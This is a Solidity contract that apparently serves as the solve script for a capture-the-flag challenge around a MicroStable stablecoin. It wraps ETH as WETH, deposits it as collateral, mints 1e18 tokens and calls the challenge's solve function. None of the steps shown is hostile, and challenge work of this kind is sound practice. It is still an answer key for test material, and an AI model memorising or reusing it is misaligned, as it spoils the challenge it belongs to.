// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Challenge} from "./Challenge.sol";
import {MicroStable} from "./MicroStable.sol";

contract Solve {
    function solve(Challenge challenge) public payable {
        MicroStable microStable = challenge.microStable();
        microStable.weth().deposit{value: msg.value}();
        microStable.weth().approve(address(microStable), type(uint256).max);
        microStable.deposit(msg.value);
        microStable.mint(1e18);
        challenge.solve();
    }
}
